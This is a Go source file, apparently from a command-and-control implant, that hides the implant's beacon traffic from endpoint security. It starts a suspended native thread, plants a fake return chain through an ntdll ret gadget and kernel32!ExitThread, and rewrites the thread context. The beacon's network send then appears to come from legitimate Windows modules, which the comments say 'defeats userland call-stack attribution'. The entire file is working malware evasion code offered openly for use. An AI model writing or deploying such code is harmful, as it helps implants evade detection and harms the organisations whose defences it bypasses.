//go:build windows && !arm64

package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	beaconSpoofK32    = syscall.NewLazyDLL("kernel32.dll")
	beaconSpoofCreate = beaconSpoofK32.NewProc("CreateThread")
	beaconSpoofResume = beaconSpoofK32.NewProc("ResumeThread")
	beaconSpoofClose  = beaconSpoofK32.NewProc("CloseHandle")
	beaconSpoofGetCtx = beaconSpoofK32.NewProc("GetThreadContext")
	beaconSpoofSetCtx = beaconSpoofK32.NewProc("SetThreadContext")
	beaconSpoofExit   = beaconSpoofK32.NewProc("ExitThread")
	beaconSpoofCB     uintptr
)

// beaconCONTEXT is the x64 CONTEXT layout (see winnt.h). Only the control /
// integer registers needed for stack spoofing are referenced; ContextFlags
// selects CONTEXT_CONTROL so Get/SetThreadContext only touch SegSs, EFlags,
// Rsp and Rip.
type beaconCONTEXT struct {
	P1Home      uint64
	P2Home      uint64
	P3Home      uint64
	P4Home      uint64
	P5Home      uint64
	P6Home      uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	FltSave      [512]byte
	VectorControl uint64
	DebugControl  uint64
	LastBranchToRip uint64
	LastBranchFromRip uint64
	LastExceptionToRip uint64
	LastExceptionFromRip uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
}

const (
	beaconContextControl  = 0x100001 // CONTEXT_AMD64 | CONTEXT_CONTROL
	beaconCreateSuspended = 0x00000004
)

// runBeaconSendSpoofed runs fn (the beacon network send) on a dedicated native
// Windows thread whose call stack is spoofed to originate from legitimate
// modules (ntdll ret gadget -> kernel32!ExitThread) instead of the implant's Go
// routines. This defeats userland call-stack attribution for the beaconing
// thread. When stack spoofing is disabled or unavailable, fn runs inline.
func runBeaconSendSpoofed(fn func()) {
	if !useStackSpoofing {
		fn()
		return
	}
	spoofBeaconThread(fn)
}

type beaconSpoofCtx struct {
	fn   func()
	done chan struct{}
}

// beaconSpoofTrampoline is the native-thread entry. NewCallback produces a
// stdcall thunk callable directly from CreateThread. It must not capture
// variables, so it reads the context via lpParameter.
func beaconSpoofTrampoline(lpParam uintptr) uintptr {
	ctx := (*beaconSpoofCtx)(unsafe.Pointer(lpParam))
	ctx.fn()
	close(ctx.done)
	return 0
}

func spoofBeaconThread(fn func()) {
	ctx := &beaconSpoofCtx{fn: fn, done: make(chan struct{})}

	if beaconSpoofCB == 0 {
		beaconSpoofCB = windows.NewCallback(beaconSpoofTrampoline)
	}

	gadget, err := findRetGadget()
	if err != nil {
		if Debug {
			fmt.Printf("[spoof] no ret gadget, beacon send unspoofed: %v\n", err)
		}
		fn()
		return
	}
	exitAddr := beaconSpoofExit.Addr()
	if exitAddr == 0 {
		fn()
		return
	}

	stackSize := uintptr(0x4000)
	stack, err := windows.VirtualAlloc(0, stackSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil || stack == 0 {
		if Debug {
			fmt.Printf("[spoof] stack alloc failed, beacon send unspoofed: %v\n", err)
		}
		fn()
		return
	}
	defer windows.VirtualFree(stack, 0, windows.MEM_RELEASE)

	// Spoofed return chain: [RSP] -> ntdll ret gadget -> kernel32!ExitThread.
	// During the send the stack walk shows: implant -> kernel32 -> ntdll -> kernel32.
	rsp := (stack + stackSize - 0x100) &^ 0xF
	if rsp == 0 {
		rsp = stack + stackSize - 0x100
	}
	frame := (*[2]uintptr)(unsafe.Pointer(rsp))
	frame[0] = gadget
	frame[1] = exitAddr

	r, _, _ := beaconSpoofCreate.Call(0, 0, beaconSpoofCB, uintptr(unsafe.Pointer(ctx)), beaconCreateSuspended, 0)
	hThread := uintptr(r)
	if hThread == 0 {
		if Debug {
			fmt.Printf("[spoof] CreateThread failed, beacon send unspoofed\n")
		}
		fn()
		return
	}
	defer beaconSpoofClose.Call(hThread)

	var tctx beaconCONTEXT
	tctx.ContextFlags = beaconContextControl
	ret, _, _ := beaconSpoofGetCtx.Call(hThread, uintptr(unsafe.Pointer(&tctx)))
	if ret == 0 {
		// GetThreadContext failed; fall back to an unspoofed send.
		beaconSpoofResume.Call(hThread)
		<-ctx.done
		return
	}
	tctx.Rip = uint64(beaconSpoofCB)
	tctx.Rsp = uint64(rsp)
	if _, _, ec := beaconSpoofSetCtx.Call(hThread, uintptr(unsafe.Pointer(&tctx))); ec != nil && Debug {
		fmt.Printf("[spoof] SetThreadContext failed: %v\n", ec)
	}
	beaconSpoofResume.Call(hThread)
	<-ctx.done
}
